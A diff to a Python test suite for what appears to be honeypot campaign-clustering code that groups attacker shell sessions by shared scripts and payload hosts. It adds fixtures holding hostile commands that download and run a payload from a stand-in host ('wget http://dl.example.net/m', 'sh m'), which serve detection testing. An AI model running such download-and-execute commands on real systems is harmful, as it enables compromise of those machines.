@@ -85,7 +85,7 @@ async def test_events_and_sessions_carry_techniques_and_the_daily_table_counts_o
     engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
 ) -> None:
     enr = enricher(tmp_path)
-    first = shell_session("a", "203.0.113.1", script("203.0.113.66"))
+    first = shell_session("a", "192.0.2.1", script("203.0.113.66"))
     await write_batch(factory, first[:3], enr)
     await write_batch(factory, first[3:], enr)
     ev = await rows(
@@ -127,8 +127,8 @@ async def test_a_script_seen_from_two_sources_becomes_a_campaign_that_grows_and_
 
     # Two sources run the same script against different payload hosts, a third one is alone.
     batch = [
-        *shell_session("a", "203.0.113.1", script("203.0.113.66")),
-        *shell_session("b", "203.0.113.2", script("198.51.100.77"), offset=10),
+        *shell_session("a", "192.0.2.1", script("203.0.113.66")),
+        *shell_session("b", "198.51.100.2", script("198.51.100.77"), offset=10),
         *shell_session("c", "203.0.113.3", ["id", "ls /root"], offset=20),
     ]
     await write_batch(factory, batch, enr)
@@ -161,12 +161,13 @@ async def test_a_script_seen_from_two_sources_becomes_a_campaign_that_grows_and_
     assert members[0].clustered_at is not None
     assert members[2].clustered_at is None  # keyless but young: re-checked until 24 h old
     keys = await rows(engine, "SELECT kind FROM campaign_keys WHERE campaign_id = :c", c=c.id)
-    assert {"script", "payload_host"} <= {k.kind for k in keys}
+    # Only the script was seen from two networks: the single-source hosts are not stored.
+    assert {k.kind for k in keys} == {"script"}
     links = await rows(engine, "SELECT count(*) AS n FROM campaign_sessions")
     assert links[0].n == 2
 
     # A new source with the same script joins even though it is the only new one.
-    await write_batch(factory, shell_session("d", "203.0.113.4", script("192.0.2.9")), enr)
+    await write_batch(factory, shell_session("d", "192.0.2.4", script("192.0.2.9")), enr)
     stats = await run_cycle(factory, ATTACK, cfg, cache, now=LATER + timedelta(minutes=5))
     assert (stats.created, stats.joined) == (0, 1)
     camp = await rows(engine, "SELECT sessions, sources FROM campaigns")
@@ -178,16 +179,14 @@ async def test_a_script_seen_from_two_sources_becomes_a_campaign_that_grows_and_
 
     # A second campaign, from a shared payload host, then a session that bridges both.
     other = [
-        *shell_session("e", "203.0.113.5", ["cd /tmp", "wget http://dl.example.net/m", "sh m"]),
+        *shell_session("e", "198.51.100.5", ["cd /tmp", "wget http://dl.example.net/m", "sh m"]),
         *shell_session("f", "203.0.113.6", ["wget http://dl.example.net/m", "sh m", "exit"], 10),
     ]
     await write_batch(factory, other, enr)
     await run_cycle(factory, ATTACK, cfg, cache, now=LATER + timedelta(minutes=20))
     assert (await rows(engine, "SELECT count(*) AS n FROM campaigns"))[0].n == 2
 
-    bridge = shell_session(
-        "g", "203.0.113.7", [*script("203.0.113.66"), "wget http://dl.example.net/m"]
-    )
+    bridge = shell_session("g", "203.0.113.7", script("dl.example.net"))
     await write_batch(factory, bridge, enr)
     stats = await run_cycle(factory, ATTACK, cfg, cache, now=LATER + timedelta(minutes=30))
     assert stats.merged == 1
@@ -212,8 +211,8 @@ async def test_benign_sessions_are_never_clustered(
     await write_batch(
         factory,
         [
-            *shell_session("a", "203.0.113.1", script("203.0.113.66")),
-            *shell_session("b", "203.0.113.2", script("203.0.113.66"), offset=10),
+            *shell_session("a", "192.0.2.1", script("203.0.113.66")),
+            *shell_session("b", "198.51.100.2", script("203.0.113.66"), offset=10),
         ],
         enr,
     )
@@ -226,11 +225,9 @@ async def test_benign_sessions_are_never_clustered(
 async def test_old_sessions_that_never_matched_stop_being_rechecked(
     engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
 ) -> None:
-    await write_batch(factory, shell_session("a", "203.0.113.1", ["id"]), enricher(tmp_path))
+    await write_batch(factory, shell_session("a", "192.0.2.1", ["id"]), enricher(tmp_path))
     await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=LATER)
-    assert (await rows(engine, "SELECT clustered_at FROM sessions"))[0].clustered_at is None
-    now = T0 + timedelta(hours=30)
-    await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=now)
+    # One command cannot carry a key: it is done at once.
     assert (await rows(engine, "SELECT clustered_at FROM sessions"))[0].clustered_at is not None
 
 
@@ -241,7 +238,12 @@ async def test_the_link_cap_bounds_campaign_sessions(
     events = [
         e
         for i in range(6)
-        for e in shell_session(f"s{i}", f"203.0.113.{i + 1}", script("203.0.113.66"), i * 20)
+        for e in shell_session(
+            f"s{i}",
+            f"{('192.0.2', '198.51.100', '203.0.113')[i % 3]}.{i + 1}",
+            script("203.0.113.66"),
+            i * 20,
+        )
     ]
     await write_batch(factory, events, enr)
     cfg = ClusterConfig(link_cap=4)
@@ -252,3 +254,29 @@ async def test_the_link_cap_bounds_campaign_sessions(
 
 def test_helper_time_is_utc() -> None:
     assert T0.tzinfo is UTC and isinstance(T0, datetime)
+
+
+async def test_a_keyed_session_that_matches_nothing_is_rechecked_for_thirty_days(
+    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
+) -> None:
+    await write_batch(
+        factory, shell_session("a", "192.0.2.1", script("203.0.113.66")), enricher(tmp_path)
+    )
+    await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=LATER)
+    assert (await rows(engine, "SELECT clustered_at FROM sessions"))[0].clustered_at is None
+    await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=T0 + timedelta(days=31))
+    assert (await rows(engine, "SELECT clustered_at FROM sessions"))[0].clustered_at is not None
+
+
+async def test_an_untrusted_hash_never_links_sessions(
+    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession], tmp_path: Path
+) -> None:
+    """A hash typed into a command is text, not a digest a sensor computed."""
+    digest = "a" * 64
+    events = [
+        *shell_session("a", "192.0.2.1", ["id", f"echo {digest}"]),
+        *shell_session("b", "198.51.100.2", ["uname", f"echo {digest}"], offset=10),
+    ]
+    await write_batch(factory, events, enricher(tmp_path))
+    stats = await run_cycle(factory, ATTACK, ClusterConfig(), ContentCache(), now=LATER)
+    assert stats.created == 0
